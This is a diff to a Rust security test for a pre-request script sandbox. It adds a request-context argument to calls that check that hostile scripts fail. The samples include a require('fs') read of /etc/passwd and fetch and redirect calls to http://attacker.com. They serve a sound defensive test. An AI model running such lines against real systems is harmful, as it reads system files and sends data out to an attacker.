@@ -99,25 +99,31 @@ fn security_secret_redaction_and_placeholder_protection() {
 fn security_script_sandbox_containment() {
     let empty_env = HashMap::new();
     let empty_vars = HashMap::new();
+    let empty_request = script_engine::RequestContext {
+        method: "GET".into(),
+        url: "https://example.com".into(),
+        headers: Vec::new(),
+        body: None,
+    };
 
     // 1. Attempt process / OS access
     let process_script = "process.exit(1);";
-    let res = script_engine::execute_pre_request_script(process_script, &empty_env, &empty_vars, 500);
+    let res = script_engine::execute_pre_request_script(process_script, &empty_env, &empty_vars, &empty_request, 500);
     assert!(!res.success);
 
     // 2. Attempt require() filesystem access
     let fs_script = "const fs = require('fs'); fs.readFileSync('/etc/passwd');";
-    let res = script_engine::execute_pre_request_script(fs_script, &empty_env, &empty_vars, 500);
+    let res = script_engine::execute_pre_request_script(fs_script, &empty_env, &empty_vars, &empty_request, 500);
     assert!(!res.success);
 
     // 3. Attempt window / DOM / document access
     let dom_script = "window.location.href = 'http://attacker.com';";
-    let res = script_engine::execute_pre_request_script(dom_script, &empty_env, &empty_vars, 500);
+    let res = script_engine::execute_pre_request_script(dom_script, &empty_env, &empty_vars, &empty_request, 500);
     assert!(!res.success);
 
     // 4. Attempt fetch / XMLHttpRequest network access
     let net_script = "fetch('http://attacker.com/steal');";
-    let res = script_engine::execute_pre_request_script(net_script, &empty_env, &empty_vars, 500);
+    let res = script_engine::execute_pre_request_script(net_script, &empty_env, &empty_vars, &empty_request, 500);
     assert!(!res.success);
 }
 
